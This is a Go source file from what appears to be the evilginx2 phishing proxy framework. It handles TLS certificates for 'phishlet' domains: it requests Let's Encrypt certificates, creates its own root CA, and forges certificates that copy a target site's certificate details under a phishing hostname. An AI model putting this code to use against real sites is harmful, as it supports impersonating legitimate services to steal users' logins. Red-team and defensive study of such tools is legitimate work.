package core

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"github.com/xenolf/lego/acme"
	"io/ioutil"
	"math/big"
	"os"
	"path/filepath"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type CertDb struct {
	PrivateKey    *rsa.PrivateKey
	CACert        tls.Certificate
	client        *acme.Client
	certUser      CertUser
	dataDir       string
	ns            *Nameserver
	hs            *HttpServer
	cfg           *Config
	cache         map[string]map[string]*tls.Certificate
	tls_cache     map[string]*tls.Certificate
	httpChallenge *HTTPChallenge
}

type CertUser struct {
	Email        string
	Registration *acme.RegistrationResource
	key          crypto.PrivateKey
}

func (u CertUser) GetEmail() string {
	return u.Email
}

func (u CertUser) GetRegistration() *acme.RegistrationResource {
	return u.Registration
}

func (u CertUser) GetPrivateKey() crypto.PrivateKey {
	return u.key
}

type HTTPChallenge struct {
	crt_db *CertDb
}

func (ch HTTPChallenge) Present(domain, token, keyAuth string) error {
	ch.crt_db.hs.AddACMEToken(token, keyAuth)
	return nil
}

func (ch HTTPChallenge) CleanUp(domain, token, keyAuth string) error {
	ch.crt_db.hs.ClearACMETokens()
	return nil
}

type DNSChallenge struct {
	crt_db *CertDb
}

func (ch DNSChallenge) Present(domain, token, keyAuth string) error {
	fqdn, val, ttl := acme.DNS01Record(domain, keyAuth)
	ch.crt_db.ns.AddTXT(fqdn, val, ttl)
	return nil
}

func (ch DNSChallenge) CleanUp(domain, token, keyAuth string) error {
	ch.crt_db.ns.ClearTXT()
	return nil
}

const acmeURL = "https://acme-v01.api.letsencrypt.org/directory"

//const acmeURL = "https://acme-staging.api.letsencrypt.org/directory"

func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*CertDb, error) {
	d := &CertDb{
		cfg:     cfg,
		dataDir: data_dir,
		ns:      ns,
		hs:      hs,
	}

	acme.Logger = log.NullLogger()
	d.cache = make(map[string]map[string]*tls.Certificate)
	d.tls_cache = make(map[string]*tls.Certificate)

	pkey_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "private.key"))
	if err != nil {
		// private key corrupted or not found, recreate and delete all public certificates
		os.RemoveAll(filepath.Join(data_dir, "*"))

		d.PrivateKey, err = rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return nil, fmt.Errorf("private key generation failed")
		}
		pkey_pem = pem.EncodeToMemory(&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(d.PrivateKey),
		})
		err = ioutil.WriteFile(filepath.Join(data_dir, "private.key"), pkey_pem, 0600)
		if err != nil {
			return nil, err
		}
	} else {
		block, _ := pem.Decode(pkey_pem)
		if block == nil {
			return nil, fmt.Errorf("private key is corrupted")
		}

		d.PrivateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return nil, err
		}
	}

	ca_crt_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "ca.crt"))
	if err != nil {
		notBefore := time.Now()
		aYear := time.Duration(10*365*24) * time.Hour
		notAfter := notBefore.Add(aYear)
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return nil, err
		}

		template := x509.Certificate{
			SerialNumber: serialNumber,
			Subject: pkix.Name{
				Country:            []string{},
				Locality:           []string{},
				Organization:       []string{"Evilginx Signature Trust Co."},
				OrganizationalUnit: []string{},
				CommonName:         "Evilginx Super-Evil Root CA",
			},
			NotBefore:             notBefore,
			NotAfter:              notAfter,
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
			BasicConstraintsValid: true,
			IsCA: true,
		}

		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &d.PrivateKey.PublicKey, d.PrivateKey)
		if err != nil {
			return nil, err
		}
		ca_crt_pem = pem.EncodeToMemory(&pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert,
		})
		err = ioutil.WriteFile(filepath.Join(data_dir, "ca.crt"), ca_crt_pem, 0600)
		if err != nil {
			return nil, err
		}
	}

	d.CACert, err = tls.X509KeyPair(ca_crt_pem, pkey_pem)
	if err != nil {
		return nil, err
	}

	d.certUser = CertUser{
		Email: "", //hostmaster@" + d.cfg.GetBaseDomain(),
		key:   d.PrivateKey,
	}

	d.client, err = acme.NewClient(acmeURL, &d.certUser, acme.RSA2048)
	if err != nil {
		return nil, err
	}

	d.httpChallenge = &HTTPChallenge{crt_db: d}
	d.client.SetChallengeProvider(acme.HTTP01, d.httpChallenge)
	d.client.ExcludeChallenges([]acme.Challenge{acme.TLSSNI01})

	return d, nil
}

func (d *CertDb) Reset() {
	d.certUser.Email = "" //hostmaster@" + d.cfg.GetBaseDomain()
}

func (d *CertDb) SetupCertificate(site_name string, domains []string) error {
	base_domain, ok := d.cfg.GetSiteDomain(site_name)
	if !ok {
		return fmt.Errorf("phishlet '%s' not found", site_name)
	}

	err := d.loadCertificate(site_name, base_domain)
	if err != nil {
		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
		err = d.obtainCertificate(site_name, base_domain, domains)
		if err != nil {
			return err
		}
	}
	return nil
}

func (d *CertDb) GetCertificate(site_name string, base_domain string) (*tls.Certificate, error) {
	m, ok := d.cache[base_domain]
	if ok {
		cert, ok := m[site_name]
		if ok {
			return cert, nil
		}
	}
	return nil, fmt.Errorf("certificate for phishlet '%s' and domain '%s' not found", site_name, base_domain)
}

func (d *CertDb) addCertificate(site_name string, base_domain string, cert *tls.Certificate) {
	_, ok := d.cache[base_domain]
	if !ok {
		d.cache[base_domain] = make(map[string]*tls.Certificate)
	}
	d.cache[base_domain][site_name] = cert
}

func (d *CertDb) loadCertificate(site_name string, base_domain string) error {
	crt_dir := filepath.Join(d.dataDir, base_domain)

	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
	if err != nil {
		return err
	}
	d.addCertificate(site_name, base_domain, &cert)
	return nil
}

func (d *CertDb) obtainCertificate(site_name string, base_domain string, domains []string) error {
	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil {
		return err
	}
	crt_dir := filepath.Join(d.dataDir, base_domain)

	reg, err := d.client.Register()
	if err != nil {
		return err
	}
	d.certUser.Registration = reg
	err = d.client.AgreeToTOS()
	if err != nil {
		return err
	}

	cert_res, fails := d.client.ObtainCertificate(domains, true, nil, false)
	if len(fails) > 0 {
		for domain, err := range fails {
			log.Error("[%s] %v", domain, err)
		}
		return fmt.Errorf("failed to obtain certificates")
	}

	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
	if err != nil {
		return err
	}
	d.addCertificate(site_name, base_domain, &cert)

	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
	if err != nil {
		return err
	}

	return nil
}

func (d *CertDb) getServerCertificate(host string, port int) *x509.Certificate {
	log.Debug("Fetching TLS certificate from %s:%d ...", host, port)

	config := tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
	if err != nil {
		log.Warning("Could not fetch TLS certificate from %s:%d: %s", host, port, err)
		return nil
	}
	defer conn.Close()

	state := conn.ConnectionState()

	return state.PeerCertificates[0]
}

func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	var x509ca *x509.Certificate
	var template x509.Certificate

	cert, ok := d.tls_cache[host]
	if ok {
		return cert, nil
	}

	if x509ca, err = x509.ParseCertificate(d.CACert.Certificate[0]); err != nil {
		return
	}

	srvCert := d.getServerCertificate(host, port)
	if srvCert == nil {
		return nil, fmt.Errorf("failed to get TLS certificate for: %s", host)
	} else {
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return nil, err
		}

		template = x509.Certificate{
			SerialNumber:          serialNumber,
			Issuer:                x509ca.Subject,
			Subject:               srvCert.Subject,
			NotBefore:             srvCert.NotBefore,
			NotAfter:              srvCert.NotAfter,
			KeyUsage:              srvCert.KeyUsage,
			ExtKeyUsage:           srvCert.ExtKeyUsage,
			IPAddresses:           srvCert.IPAddresses,
			DNSNames:              []string{phish_host},
			BasicConstraintsValid: true,
		}
		template.Subject.CommonName = phish_host
	}

	var pkey *rsa.PrivateKey
	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
		return
	}

	var derBytes []byte
	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, d.CACert.PrivateKey); err != nil {
		return
	}

	cert = &tls.Certificate{
		Certificate: [][]byte{derBytes, d.CACert.Certificate[0]},
		PrivateKey:  pkey,
	}

	d.tls_cache[host] = cert
	return cert, nil
}
